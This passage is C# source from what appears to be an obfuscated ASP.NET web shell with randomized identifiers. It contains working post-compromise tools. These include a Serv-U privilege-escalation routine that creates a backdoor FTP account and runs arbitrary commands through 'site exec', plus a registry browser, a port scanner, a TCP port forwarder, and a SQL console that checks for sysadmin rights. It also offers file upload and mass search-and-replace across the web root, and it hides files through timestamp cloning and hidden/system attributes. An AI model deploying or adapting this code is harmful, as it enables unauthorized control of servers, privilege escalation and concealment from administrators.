Bin_H2_Driver.InnerText="Driver Information &gt;&gt;";
StringBuilder yEwc=new StringBuilder();
StringBuilder hwJeS=new StringBuilder();
StringBuilder jXkaE=new StringBuilder();
yEwc.Append("&lt;li&gt;&lt;u&gt;Server Domain : &lt;/u&gt;"+Request.ServerVariables["SERVER_NAME"]+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server Ip : &lt;/u&gt;"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Terminal Port : &lt;/u&gt;"+IKjwH+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server OS : &lt;/u&gt;"+Environment.OSVersion+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server Software : &lt;/u&gt;"+Request.ServerVariables["SERVER_SOFTWARE"]+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server UserName : &lt;/u&gt;"+Environment.UserName+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server Time : &lt;/u&gt;"+System.DateTime.Now.ToString()+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server TimeZone : &lt;/u&gt;"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"&lt;/li&gt;");
DataTable BIOS=cCf("Win32_BIOS");
yEwc.Append("&lt;li&gt;&lt;u&gt;Server BIOS : &lt;/u&gt;"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Count : &lt;/u&gt;"+cpu.ToString()+"&lt;/li&gt;");
yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Version : &lt;/u&gt;"+NPPZ+"&lt;/li&gt;");
DataTable upM=cCf("Win32_PhysicalMemory");
Int64 oZnZV=0;
for(int i=0;i&lt;upM.Rows.Count;i++)
{
oZnZV+=Int64.Parse(upM.Rows[0]["Capacity"].ToString());
}
yEwc.Append("&lt;li&gt;&lt;u&gt;Server upM : &lt;/u&gt;"+mTG(oZnZV)+"&lt;/li&gt;");
DataTable dOza=cCf("Win32_NetworkAdapterConfiguration");
for(int i=0;i&lt;dOza.Rows.Count;i++)
{
hwJeS.Append("&lt;li&gt;&lt;u&gt;Server MAC"+i+" : &lt;/u&gt;"+dOza.Rows[i]["Caption"]+"&lt;/li&gt;");
if(dOza.Rows[i]["MACAddress"]!=string.Empty)
{
hwJeS.Append("&lt;li style=\"list-style:none;\"&gt;&lt;u&gt;Address : &lt;/u&gt;"+dOza.Rows[i]["MACAddress"]+"&lt;/li&gt;");
}
}
DataTable Driver=cCf("Win32_SystemDriver");
for (int i=0; i&lt;Driver.Rows.Count; i++)
{
jXkaE.Append("&lt;li&gt;&lt;u class='u1'&gt;Server Driver"+i+" : &lt;/u&gt;&lt;u class='u2'&gt;"+Driver.Rows[i]["Caption"]+"&lt;/u&gt; ");
if (Driver.Rows[i]["PathName"]!=string.Empty)
{
jXkaE.Append("Path : "+Driver.Rows[i]["PathName"]);
}
else
{
jXkaE.Append("No path information");
}
jXkaE.Append("&lt;/li&gt;");
}
Bin_Ul_Sys.InnerHtml=yEwc.ToString();
Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();
Bin_Ul_Driver.InnerHtml=jXkaE.ToString();
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void ADCpk()
{
WICxe();
APl.Visible=true;
Bin_H2_Title.InnerText="Serv-U Exec &gt;&gt;";
}
public void lDODR()
{
string JGGg=string.Empty;
string user=dNohJ.Value;
string pass=NMd.Value;
int port=Int32.Parse(HlQl.Value);
string cmd=mHbjB.Value;
string CRtK="user "+user+"\r\n";
string jnNG="pass "+pass+"\r\n";
string site="SITE MAINTENANCE\r\n";
string mtoJb="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
string iVDT="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
string zexn="QUIT\r\n";
UHlA.Visible=true;
try
{
tcp.Connect("127.0.0.1",port);
tcp.ReceiveBufferSize=1024;
NS=tcp.GetStream();
Rev(NS);
ZJiM(NS,CRtK);
Rev(NS);
ZJiM(NS,jnNG);
Rev(NS);
ZJiM(NS,site);
Rev(NS);
ZJiM(NS,mtoJb);
Rev(NS);
ZJiM(NS,sutI);
Rev(NS);
ZJiM(NS,iVDT);
Rev(NS);
Bin_Td_Res.InnerHtml+="&lt;font color=\"green\"&gt;&lt;b&gt;Exec Cmd.................\r\n&lt;/b&gt;&lt;/font&gt;";
zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
NS1=zvxm.GetStream();
Rev(NS1);
ZJiM(NS1,"user bin\r\n");
Rev(NS1);
ZJiM(NS1,"pass binftp\r\n");
Rev(NS1);
ZJiM(NS1,"site exec "+cmd+"\r\n");
Rev(NS1);
ZJiM(NS1,"quit\r\n");
Rev(NS1);
zvxm.Close();
ZJiM(NS,mtoJb);
Rev(NS);
tcp.Close();
}
catch(Exception error)
{
xseuB(error.Message);
}
}
protected void Rev(NetworkStream instream)
{
string FTBtf=string.Empty;
if(instream.CanRead)
{
byte[] uPZ=new byte[1024];
do
{
System.Threading.Thread.Sleep(50);
int len=instream.Read(uPZ,0,uPZ.Length);
FTBtf+=Encoding.Default.GetString(uPZ,0,len);
}
while(instream.DataAvailable);
}
Bin_Td_Res.InnerHtml+="&lt;font color=red&gt;"+FTBtf.Replace("&#92;&#48;","")+"&lt;/font&gt;";
}
protected void ZJiM(NetworkStream instream,string Sendstr)
{
if(instream.CanWrite)
{
byte[] uPZ=Encoding.Default.GetBytes(Sendstr);
instream.Write(uPZ,0,uPZ.Length);
}
Bin_Td_Res.InnerHtml+="&lt;font color=blue&gt;"+Sendstr+"&lt;/font&gt;";
}
public void xFhz()
{
WICxe();
kkHN.Visible=true;
Bin_H2_Title.InnerText="RegShell &gt;&gt;";
string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
vyX.Text="";
foreach(string rootkey in txc.Split('|'))
{
vyX.Text+="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt; | ";
}
lFAvw();
}
protected void lFAvw()
{
qPdI.Text="";
string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
TableRow tr;
TableCell tc;
foreach(string rootkey in txc.Split('|'))
{
tr=new TableRow();
tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt;";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;RootKey&gt;";
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
}
protected void tpRQ(string Reg_Path)
{
if(!Reg_Path.EndsWith("\\"))
{
Reg_Path=Reg_Path+"\\";
}
qPdI.Text=Reg_Path;
string cJG=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
cJG=Regex.Replace(cJG,@"\\+","\\");
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(cJG)+"')\"&gt;Parent Key&lt;/a&gt;";
tc.Attributes["colspan"]="2" ;
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
try
{
string subpath;
string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
RegistryKey rk=null;
RegistryKey sk;
if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
{
rk=Registry.LocalMachine;
}
else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
{
rk=Registry.ClassesRoot;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
{
rk=Registry.CurrentUser;
}
else if(Reg_Path.StartsWith("HKEY_USERS"))
{
rk=Registry.Users;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
{
rk=Registry.CurrentConfig;
}
if(kDgkX.Length&gt;1)
{
sk=rk.OpenSubKey(kDgkX);
}
else
{
sk=rk;
}
foreach(string innerSubKey in sk.GetSubKeyNames())
{
tr=new TableRow();
tc=new TableCell();
bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(Reg_Path+innerSubKey)+"')\"&gt;"+innerSubKey+"&lt;/a&gt;";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;SubKey&gt;";
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
TableRow cKVA=new TableRow();
cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
cKVA.Attributes["bgcolor"]="#dddddd";
TableCell JlmW=new TableCell();
JlmW.Attributes["colspan"]="2" ;
JlmW.Attributes["height"]="5";
cKVA.Cells.Add(JlmW);
pLWD.Rows.Add(cKVA);
foreach(string strValueName in sk.GetValueNames())
{
tr=new TableRow();
tc=new TableCell();
bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text=strValueName;
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text=DdmPl(sk,strValueName);
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public string DdmPl(RegistryKey sk,string strValueName)
{
object uPZ;
string RaTGr="";
try
{
uPZ=sk.GetValue(strValueName,"NULL");
if(uPZ.GetType()==typeof(byte[]))
{
foreach(byte tmpbyte in(byte[])uPZ)
{
if((int)tmpbyte&lt;16)
{
RaTGr+="0";
}
RaTGr+=tmpbyte.ToString("X");
}
}
else if(uPZ.GetType()==typeof(string[]))
{
foreach(string tmpstr in(string[])uPZ)
{
RaTGr+=tmpstr;
}
}
else
{
RaTGr=uPZ.ToString();
}
}
catch(Exception error)
{
xseuB(error.Message);
}
return RaTGr;
}
public void vNCHZ()
{
WICxe();
YwLB.Visible=true;
Bin_H2_Title.InnerText="PortScan &gt;&gt;";
}
public void rAhe()
{
WICxe();
iDgmL.Visible=true;
dQIIF.Visible=false;
Bin_H2_Title.InnerText="DataBase &gt;&gt;";
}
protected void OUj()
{
if(Dtdr.State==ConnectionState.Closed)
{
try
{
Dtdr.ConnectionString=MasR.Text;
Kkvb.Connection=Dtdr;
Dtdr.Open();
}
catch(Exception Error)
{
xseuB(Error.Message);
}
}
}
protected void fUzE()
{
if(Dtdr.State==ConnectionState.Open)
Dtdr.Close();
Dtdr.Dispose();
Kkvb.Dispose();
}
public DataTable CYUe(string sqlstr)
{
OleDbDataAdapter da=new OleDbDataAdapter();
DataTable Dstog=new DataTable();
try
{
OUj();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=sqlstr;
da.SelectCommand=Kkvb;
da.Fill(Dstog);
}
catch(Exception)
{
}
finally
{
fUzE();
}
return Dstog;
}
public DataTable[] Bin_Data(string query)
{
ArrayList list=new ArrayList();
try
{
string str;
OUj();
query=query+"\r\n";
MatchCollection gcod=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
int EmRX=0;
for(int i=0;i&lt;gcod.Count;i++)
{
Match FJD=gcod[i];
str=query.Substring(EmRX,FJD.Index-EmRX);
if(str.Trim().Length&gt;0)
{
OleDbDataAdapter FgzeQ=new OleDbDataAdapter();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=str.Trim();
FgzeQ.SelectCommand=Kkvb;
DataSet cDPp=new DataSet();
FgzeQ.Fill(cDPp);
for(int j=0;j&lt;cDPp.Tables.Count;j++)
{
list.Add(cDPp.Tables[j]);
}
}
EmRX=FJD.Index+3;
}
str=query.Substring(EmRX,query.Length-EmRX);
if(str.Trim().Length&gt;0)
{
OleDbDataAdapter VwB=new OleDbDataAdapter();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=str.Trim();
VwB.SelectCommand=Kkvb;
DataSet arG=new DataSet();
VwB.Fill(arG);
for(int k=0;k&lt;arG.Tables.Count;k++)
{
list.Add(arG.Tables[k]);
}
}
}
catch(SqlException e)
{
xseuB(e.Message);
rom.Visible=false;
}
return(DataTable[])list.ToArray(typeof(DataTable));
}
public void JIAKU(string instr)
{
try
{
OUj();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=instr;
Kkvb.ExecuteNonQuery();
}
catch(Exception e)
{
xseuB(e.Message);
}
}
public void dwgT()
{
try
{
OUj();
if(WYmo.SelectedItem.Text=="MSSQL")
{
if(Pvf.SelectedItem.Value!="")
{
Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());
}
}
DataTable[] jxF=null;
jxF=Bin_Data(jHIy.InnerText);
if(jxF!=null && jxF.Length&gt;0)
{
for(int j=0;j&lt;jxF.Length;j++)
{
rom.PreRender+=new EventHandler(lRavM);
rom.DataSource=jxF[j];
rom.DataBind();
for(int i=0;i&lt;rom.Items.Count;i++)
{
string bg=OKM();
rom.Items[i].CssClass=bg;
rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
}
}
}
else
{
rom.DataSource=null;
rom.DataBind();
}
rom.Visible=true;
}
catch(Exception e)
{
xseuB(e.Message);
rom.Visible=false;
}
}
public void xTZY()
{
try
{
if(WYmo.SelectedItem.Text=="MSSQL")
{
if(Pvf.SelectedItem.Value=="")
{
rom.DataSource=null;
rom.DataBind();
return;
}
}
OUj();
DataTable zKvOw=new DataTable();
DataTable jxF=new DataTable();
DataTable baVJV=new DataTable();
if(WYmo.SelectedItem.Text=="MSSQL" && Pvf.SelectedItem.Value!="")
{
Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);
}
zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
foreach(DataRow dr in zKvOw.Rows)
{
jxF.ImportRow(dr);
}
jxF.Columns.Remove("TABLE_CATALOG");jxF.Columns.Remove("TABLE_SCHEMA");jxF.Columns.Remove("DESCRIPTION");jxF.Columns.Remove("TABLE_PROPID");
rom.PreRender+=new EventHandler(lRavM);
rom.DataSource=jxF;
rom.DataBind();
for(int i=0;i&lt;rom.Items.Count;i++)
{
string bg=OKM();
rom.Items[i].CssClass=bg;
rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
}
rom.Visible=true;
}
catch(Exception e)
{
xseuB(e.Message);
rom.Visible=false;
}
}
private void lRavM(object sender,EventArgs e)
{
DataGrid d=(DataGrid)sender;
foreach(DataGridItem item in d.Items)
{
foreach(TableCell t in item.Cells)
{
t.Text=t.Text.Replace("&lt;","&lt;").Replace("&gt;","&gt;");
}
}
}
public void vCf()
{
dQIIF.Visible=true;
try
{
jHIy.InnerHtml=string.Empty;
if(WYmo.SelectedItem.Text=="MSSQL")
{
rom.Visible=false;
uXevN.Visible=true;
irTU.Visible=true;
OUj();
DataTable ver=CYUe(@"SELECT @@VERSION");
DataTable dbs=CYUe(@"SELECT name FROM master.dbo.sysdatabases");
DataTable cdb=CYUe(@"SELECT DB_NAME()");
DataTable rol=CYUe(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
DataTable YKrm=CYUe(@"SELECT IS_MEMBER('db_owner')");
string jHlh=ver.Rows[0][0].ToString();
string dbo=string.Empty;
if(YKrm.Rows[0][0].ToString()=="1")
{
dbo="db_owner";
}
else
{
dbo="public";
}
if(rol.Rows[0][0].ToString()=="1")
{
dbo="&lt;font color=blue&gt;sa&lt;/font&gt;";
}
string db_name=string.Empty;
foreach(ListItem item in FGEy.Items)
{
 if(item.Selected=true)
 {
 item.Selected=false;
 }
}
Pvf.Items.Clear();
Pvf.Items.Add("-- Select a DataBase --");
Pvf.Items[0].Value="";
for(int i=0;i&lt;dbs.Rows.Count;i++)
{
db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"&lt;font color=blue&gt;"+cdb.Rows[0][0].ToString()+"&lt;/font&gt;")+"&nbsp;|&nbsp;";
Pvf.Items.Add(dbs.Rows[i][0].ToString());
}
irTU.InnerHtml="&lt;p&gt;&lt;font color=red&gt;MSSQL Version&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+jHlh+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;font color=red&gt;SrvRoleMember&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+dbo+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;";
}
else
{
uXevN.Visible=false;
irTU.Visible=false;
xTZY();
}
}
catch(Exception e)
{
dQIIF.Visible=false;
}
}
public void MHLv()
{
WICxe();
hOWTm.Visible=true;
Bin_H2_Title.InnerText="PortMap &gt;&gt;";
}
public class PortForward
{
public string Localaddress;
public int LocalPort;
public string RemoteAddress;
public int RemotePort;
string type;
Socket ltcpClient;
Socket rtcpClient;
Socket server;
byte[] DPrPL=new byte[2048];
byte[] wvZv=new byte[2048];
public struct session
{
public Socket rdel;
public Socket ldel;
public int llen;
public int rlen;
}
public static IPEndPoint mtJ(string host,int port)
{
IPEndPoint iep=null;
IPHostEntry aGN=Dns.Resolve(host);
IPAddress rmt=aGN.AddressList[0];
iep=new IPEndPoint(rmt,port);
return iep;
}
public void Start(string Rip,int Rport,string lip,int lport)
{
try
{
LocalPort=lport;
RemoteAddress=Rip;
RemotePort=Rport;
Localaddress=lip;
rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);
}
catch (Exception ex) { }
}
protected void iiGFO(IAsyncResult ar)
{
try
{
session RKXy=new session();
RKXy.ldel=ltcpClient;
RKXy.rdel=rtcpClient;
ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);
}
catch (Exception ex) { }
}
protected void VTp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
ltcpClient.EndConnect(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);
}
catch (Exception ex) { }
}
private void LFYM(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.rdel.EndReceive(ar);
if (Ret&gt;0)
ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);
else lyTOK();
}
catch (Exception ex) { }
}
private void JTcp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.ldel.EndSend(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);
}
catch (Exception ex) { }
}
private void xPS(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.ldel.EndReceive(ar);
if (Ret&gt;0)
RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);
else lyTOK();
}
catch (Exception ex) { }
}
private void IZU(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.rdel.EndSend(ar);
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);
}
catch (Exception ex) { }
}
public void lyTOK()
{
try
{
if (ltcpClient!=null)
{
ltcpClient.Close();
}
if (rtcpClient!=null)
rtcpClient.Close();
}
catch (Exception ex) { }
}
}
protected void vuou()
{
PortForward gYP=new PortForward();
gYP.lyTOK();
}
protected void ruQO()
{
PortForward gYP=new PortForward();
gYP.Start(llH.Value,int.Parse(ZHS.Value),eEpm.Value,int.Parse(iXdh.Value));
}
public string mRDl(string instr)
{
string tmp=null;
try
{
tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();
}
catch(Exception e)
{
}
return tmp;
}
public void VikG()
{
string[] OTV=lOmX.Text.ToString().Split(',');
for(int i=0;i&lt;OTV.Length;i++)
{
IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));
}
try
{
Thread[] kbXY=new Thread[IVc.Count];
int sdO=0;
for(sdO=0;sdO&lt;IVc.Count;sdO++)
{
kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));
kbXY[sdO].Start();
}
for(sdO=0;sdO&lt;kbXY.Length;sdO++)
kbXY[sdO].Join();
}
catch
{
}
}
public class ScanPort
{
private string _ip="";
private int jTdO=0;
private TimeSpan _timeSpent;
private string QGcH="Not scanned";
public string ip
{
get { return _ip;}
}
public int port
{
get { return jTdO;}
}
public string status
{
get { return QGcH;}
}
public TimeSpan timeSpent
{
get { return _timeSpent;}
}
public ScanPort(string ip,int port)
{
_ip=ip;
jTdO=port;
}
public void Scan()
{
TcpClient iYap=new TcpClient();
DateTime qYZT=DateTime.Now;
try
{
iYap.Connect(_ip,jTdO);
iYap.Close();
QGcH="&lt;font color=green&gt;&lt;b&gt;Open&lt;/b&gt;&lt;/font&gt;";
}
catch
{
QGcH="&lt;font color=red&gt;&lt;b&gt;Close&lt;/b&gt;&lt;/font&gt;";
}
_timeSpent=DateTime.Now.Subtract(qYZT);
}
}
public static void YFcNP(System.Web.UI.Page page)
{
page.RegisterHiddenField("__EVENTTARGET","");
page.RegisterHiddenField("__FILE","");
string s=@"&lt;script language=Javascript&gt;";
s+=@"function Bin_PostBack(eventTarget,eventArgument)";
s+=@"{";
s+=@"var theform=document.forms[0];";
s+=@"theform.__EVENTTARGET.value=eventTarget;";
s+=@"theform.__FILE.value=eventArgument;";
s+=@"theform.submit();";
s+=@"} ";
s+=@"&lt;/scr"+"ipt&gt;";
page.RegisterStartupScript("",s);
}
protected void PPtK(object sender,EventArgs e)
{
WICxe();
yhv.Visible=true;
Bin_H2_Title.InnerText="File Search &gt;&gt;";
NaLJ.Value=Request.PhysicalApplicationPath;
oJiym.Visible=false;
}
protected void NBy(object sender,EventArgs e)
{
DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);
if(!GQMM.Exists)
{
xseuB("Path invalid ! ");
return;
}
oog(GQMM);
xseuB("Search completed ! ");
}
public void oog(DirectoryInfo dir)
{
try
{
oJiym.Visible=true;
foreach(FileInfo Bin_Files in dir.GetFiles())
{
try
{
if(Bin_Files.FullName==Request.PhysicalPath)
{
continue;
}
if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+UDLvA.Value+")$",RegexOptions.IgnoreCase))
{
continue;
}
if(Ven.SelectedItem.Value=="name")
{
if(rAQ.Checked)
{
if(Regex.IsMatch(Bin_Files.Name,iaMKl.Value,RegexOptions.IgnoreCase))
{
FJvQ(Bin_Files);
}
}
else
{
if(Bin_Files.Name.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
{
Response.Write(Bin_Files.FullName);
FJvQ(Bin_Files);
}
}
}
else
{
StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
string ava=sr.ReadToEnd();
sr.Close();
if(rAQ.Checked)
{
if(Regex.IsMatch(ava,iaMKl.Value,RegexOptions.IgnoreCase))
{
FJvQ(Bin_Files);
if(YZw.Checked)
{
ava=Regex.Replace(ava,iaMKl.Value,qPe.Value,RegexOptions.IgnoreCase);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(ava);
sw.Close();
}
}
}
else
{
if(ava.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
{
FJvQ(Bin_Files);
if(YZw.Checked)
{
ava=Strings.Replace(ava,iaMKl.Value,qPe.Value,1,-1,CompareMethod.Text);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(ava);
sw.Close();
}
}
}
}
}
catch(Exception ex)
{
xseuB(ex.Message);
continue;
}
}
foreach(DirectoryInfo subdir in dir.GetDirectories())
{
oog(subdir);
}
}
catch(Exception ex)
{
xseuB(ex.Message);
}
}
public void FJvQ(FileInfo objfile)
{
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\"&gt;"+objfile.FullName+"&lt;/a&gt;";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=objfile.LastWriteTime.ToString();
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=mTG(objfile.Length);
tr.Cells.Add(tc);
oJiym.Rows.Add(tr);
}
public void xseuB(string instr)
{
jDKt.Visible=true;
jDKt.InnerText=instr;
}
protected void xVm(object sender,EventArgs e)
{
string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();
if(Jfm==Password)
{
Response.Cookies.Add(new HttpCookie(vbhLn,Password));
ljtzC.Visible=false;
PBZw();
}
else
{
tZSx();
}
}
protected void Ybg(object sender,EventArgs e)
{
krIR(Server.MapPath("."));
}
protected void KjPi(object sender,EventArgs e)
{
Bin_H2_Title.InnerText="IIS Spy &gt;&gt;";
WICxe();
VNR.Visible=true;
AdCx();
}
protected void DGCoW(object sender,EventArgs e)
{
try
{
StreamWriter sw;
if(NdCX.SelectedItem.Text=="UTF-8")
{
sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);
}
else
{
sw=new StreamWriter(Sqon.Value,false,Encoding.Default);
}
sw.Write(Xgvv.InnerText);
sw.Close();
xseuB("Save file success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void lbjLD(object sender,EventArgs e)
{
string FlwA=AXSbb.Value;
FlwA=OElM(FlwA);
try
{
Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));
xseuB("File upload success!");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void EXV(object sender,EventArgs e)
{
krIR(AXSbb.Value);
}
protected void mcCY(object sender,EventArgs e)
{
krIR(Server.MapPath("."));
}
protected void iVk(object sender,CommandEventArgs e)
{
krIR(e.CommandArgument.ToString());
}
protected void XXrLw(object sender,EventArgs e)
{
try
{
File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));
File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));
File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));
xseuB("File time clone success!");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void tIykC(object sender,EventArgs e)
{
string path=pWVL.Value;
try
{
File.SetAttributes(path,FileAttributes.Normal);
if(ZhWSK.Checked)
{
File.SetAttributes(path,FileAttributes.ReadOnly);
}
if(SsR.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
}
if(ccB.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
}
if(fbyZ.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
}
File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));
File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));
File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));
xseuB("File attributes modify success!");
}
catch(Exception error)
{
